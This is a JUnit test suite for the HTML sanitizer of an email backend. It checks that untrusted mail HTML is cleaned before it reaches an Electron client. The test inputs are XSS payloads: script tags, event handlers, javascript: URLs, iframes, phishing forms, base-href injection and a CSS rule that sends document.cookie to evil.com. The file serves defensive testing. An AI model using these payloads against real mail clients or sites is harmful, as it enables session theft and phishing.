package org.voxrox.mailbackend.util;

import static org.assertj.core.api.Assertions.assertThat;

import java.util.Map;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;

/**
 * XSS / UI-redressing audit for {@link HtmlSanitizer}.
 *
 * Each test documents one concrete attack vector. If any of them passes
 * through, the backend ships potentially malicious HTML to the Electron client.
 */
class HtmlSanitizerTest {

    @Nested
    @DisplayName("Basic inputs")
    class BasicInputs {

        @Test
        @DisplayName("null -> empty string")
        void nullInputReturnsEmpty() {
            assertThat(HtmlSanitizer.sanitize(null)).isEmpty();
        }

        @Test
        @DisplayName("empty / whitespace input -> empty string")
        void blankInputReturnsEmpty() {
            assertThat(HtmlSanitizer.sanitize("")).isEmpty();
            assertThat(HtmlSanitizer.sanitize("   ")).isEmpty();
        }

        @Test
        @DisplayName("Plain HTML content passes through and is wrapped in the wrapper div")
        void plainHtmlPassesThrough() {
            String out = HtmlSanitizer.sanitize("<p>Hello <b>world</b></p>");
            assertThat(out).contains("<p>Hello <b>world</b></p>");
            assertThat(out).startsWith("<div class='mail-content-wrapper'");
        }
    }

    @Nested
    @DisplayName("XSS - script execution vectors")
    class ScriptExecution {

        @Test
        @DisplayName("<script> tag is removed")
        void stripsScriptTag() {
            String out = HtmlSanitizer.sanitize("<p>Hi</p><script>alert('xss')</script>");
            assertThat(out).doesNotContain("<script").doesNotContain("alert");
        }

        @Test
        @DisplayName("onclick event handler is removed")
        void stripsOnclickHandler() {
            String out = HtmlSanitizer.sanitize("<a href='https://example.com' onclick=\"alert(1)\">click</a>");
            assertThat(out).doesNotContain("onclick").doesNotContain("alert(1)");
        }

        @Test
        @DisplayName("onerror event handler on <img> is removed")
        void stripsOnerrorHandler() {
            String out = HtmlSanitizer.sanitize("<img src='x' onerror='alert(1)' />");
            assertThat(out).doesNotContain("onerror").doesNotContain("alert(1)");
        }

        @Test
        @DisplayName("javascript: URL in href is removed")
        void stripsJavascriptUrl() {
            String out = HtmlSanitizer.sanitize("<a href=\"javascript:alert(1)\">click</a>");
            assertThat(out).doesNotContain("javascript:").doesNotContain("alert(1)");
        }

        @Test
        @DisplayName("<iframe> is removed")
        void stripsIframe() {
            String out = HtmlSanitizer.sanitize("<iframe src='https://evil.com'></iframe>");
            assertThat(out).doesNotContain("<iframe");
        }

        @Test
        @DisplayName("<object> / <embed> are removed")
        void stripsObjectAndEmbed() {
            String out = HtmlSanitizer.sanitize("<object data='x'></object><embed src='x'/>");
            assertThat(out).doesNotContain("<object").doesNotContain("<embed");
        }

        @Test
        @DisplayName("<style> block is removed (prevents CSS-based exfiltration)")
        void stripsStyleBlock() {
            String out = HtmlSanitizer
                    .sanitize("<style>p{background:url('https://evil.com/?d='+document.cookie)}</style><p>hi</p>");
            assertThat(out).doesNotContain("<style");
        }

        @Test
        @DisplayName("<base> tag is removed (prevents base-href injection)")
        void stripsBaseTag() {
            String out = HtmlSanitizer.sanitize("<base href='https://evil.com/'><a href='/login'>click</a>");
            assertThat(out).doesNotContain("<base");
        }

        @Test
        @DisplayName("<form> + <input> (phishing) are removed")
        void stripsFormAndInput() {
            String out = HtmlSanitizer.sanitize("<form action='https://evil.com'><input name='password'/></form>");
            assertThat(out).doesNotContain("<form").doesNotContain("<input");
        }
    }

    @Nested
    @DisplayName("Links - target=_blank + rel=noopener")
    class LinkHardening {

        @Test
        @DisplayName("Link receives target=_blank and rel=noopener noreferrer nofollow")
        void addsNoopenerRel() {
            String out = HtmlSanitizer.sanitize("<a href='https://example.com'>click</a>");
            assertThat(out).contains("target=\"_blank\"");
            assertThat(out).contains("rel=\"nofollow noopener noreferrer\"");
        }

        @Test
        @DisplayName("Existing rel is overwritten (input is not trusted)")
        void overridesExistingRel() {
            String out = HtmlSanitizer.sanitize("<a href='https://example.com' rel='opener'>click</a>");
            assertThat(out).contains("rel=\"nofollow noopener noreferrer\"");
            assertThat(out).doesNotContain("rel=\"opener\"");
        }
    }

    @Nested
    @DisplayName("Default privacy hardening")
    class DefaultPrivacyHardening {

        @Test
        @DisplayName("Inline style from untrusted HTML is fully stripped")
        void stripsInlineStyleCompletely() {
            String out = HtmlSanitizer.sanitize(
                    "<div style='color:red; position:fixed; background:url(https://evil.test/pixel)'>text</div>");

            assertThat(out).contains("<div>text</div>");
            assertThat(out).doesNotContain("color:red").doesNotContain("position").doesNotContain("background:url")
                    .doesNotContain("evil.test");
        }

        @Test
        @DisplayName("Remote https image is preserved inertly (data-voxrox-remote-src, no live src)")
        void preservesRemoteHttpsImagesInertly() {
            String url = "https://tracker.example.test/pixel.png";
            String out = HtmlSanitizer.sanitize("<p>hi</p><img src='" + url + "' alt='x'>");

            assertThat(out).contains("<p>hi</p>");
            assertThat(out).contains("<img").contains("data-voxrox-remote-src=\"" + url + "\"");
            // Inert at rest: the persisted body must never carry a live remote src. A
            // live src is always space-separated from the tag/previous attribute, so a
            // leading space distinguishes it from the data-*-remote-src attribute.
            assertThat(out).doesNotContain(" src=\"http");
        }

        @Test
        @DisplayName("Remote http (cleartext) image is dropped entirely — no opt-in path")
        void dropsRemoteHttpImages() {
            String out = HtmlSanitizer.sanitize("<p>hi</p><img src='http://tracker.example.test/pixel.png' alt='x'>");

            assertThat(out).contains("<p>hi</p>");
            assertThat(out).doesNotContain("<img").doesNotContain("tracker.example.test");
        }

        @Test
        @DisplayName("Unresolved CID images are dropped (no matching inline part)")
        void dropsUnresolvedCidImages() {
            String out = HtmlSanitizer.sanitize("<img src='cid:logo-123' alt='Logo'>");

            assertThat(out).doesNotContain("<img").doesNotContain("cid:");
        }

        @Test
        @DisplayName("CID images are rewritten to their inlined data: URI")
        void resolvesCidImagesFromInlineMap() {
            String dataUri = "data:image/png;base64,iVBORw0KGgo=";
            String out = HtmlSanitizer.sanitize("<img src='cid:Logo-123' alt='Logo'>", Map.of("logo-123", dataUri));

            assertThat(out).contains("<img").contains("src=\"" + dataUri + "\"").contains("alt=\"Logo\"");
        }

        @Test
        @DisplayName("Safe inline data:image sources are preserved")
        void keepsDataImageSources() {
            String out = HtmlSanitizer.sanitize("<img src='data:image/png;base64,iVBORw0KGgo=' alt='inline'>");

            assertThat(out).contains("<img").contains("src=\"data:image/png;base64,iVBORw0KGgo=\"")
                    .contains("alt=\"inline\"");
        }

        @Test
        @DisplayName("Non-image data: sources are removed")
        void stripsNonImageDataSources() {
            String out = HtmlSanitizer.sanitize("<img src='data:text/html;base64,PHNjcmlwdD4=' alt='x'>");

            assertThat(out).doesNotContain("<img").doesNotContain("data:text/html");
        }

        @Test
        @DisplayName("FTP links lose their href; no safe scheme is invented")
        void stripsUnsupportedLinkProtocols() {
            String out = HtmlSanitizer.sanitize("<a href='ftp://example.com/file'>file</a>");

            assertThat(out).contains("<a>file</a>");
            assertThat(out).doesNotContain("ftp://");
        }
    }

    @Nested
    @DisplayName("Plain-text bodies (F3)")
    class PlainText {

        @Test
        @DisplayName("Literal markup-like sequences are escaped, not dropped")
        void escapesLiteralAngleBrackets() {
            String out = HtmlSanitizer.escapePlainText("if a<b and c>d then x&y");

            assertThat(out).contains("a&lt;b and c&gt;d").contains("x&amp;y");
            assertThat(out).startsWith("<div class='mail-content-wrapper'").contains("<pre>");
            assertThat(out).doesNotContain("<b and");
        }

        @Test
        @DisplayName("A tag-like line is not interpreted as HTML")
        void doesNotDropTagLikeContent() {
            String out = HtmlSanitizer.escapePlainText("<not-a-real-tag>keep me</not-a-real-tag>");

            assertThat(out).contains("&lt;not-a-real-tag&gt;keep me&lt;/not-a-real-tag&gt;");
        }

        @Test
        @DisplayName("null / blank -> empty string")
        void blankReturnsEmpty() {
            assertThat(HtmlSanitizer.escapePlainText(null)).isEmpty();
            assertThat(HtmlSanitizer.escapePlainText("   ")).isEmpty();
        }
    }

    @Nested
    @DisplayName("Failure fallback")
    class FallbackBehavior {

        @Test
        @DisplayName("Extremely long input does not throw — it is just cleaned up")
        void verylongInputDoesNotThrow() {
            String bomb = "<p>" + "x".repeat(100_000) + "</p>";
            // Must not fail or return the fallback div
            String out = HtmlSanitizer.sanitize(bomb);
            assertThat(out).contains("<p>");
            assertThat(out).doesNotContain("blocked for security reasons");
        }
    }

    @Nested
    @DisplayName("CID reference extraction")
    class CidReferences {

        @Test
        @DisplayName("Extracts and normalizes cid: references across quote styles")
        void extractsReferencedCids() {
            String html = "<img src=\"cid:Logo\"><img src='cid:pic@host'><img src=cid:banner>";

            assertThat(HtmlSanitizer.referencedCids(html)).containsExactlyInAnyOrder("logo", "pic@host", "banner");
        }

        @Test
        @DisplayName("Returns empty for a body with no cid: reference")
        void noCidReferences() {
            assertThat(HtmlSanitizer.referencedCids("<p>hi <a href='https://x.test'>link</a></p>")).isEmpty();
            assertThat(HtmlSanitizer.referencedCids("")).isEmpty();
        }
    }
}
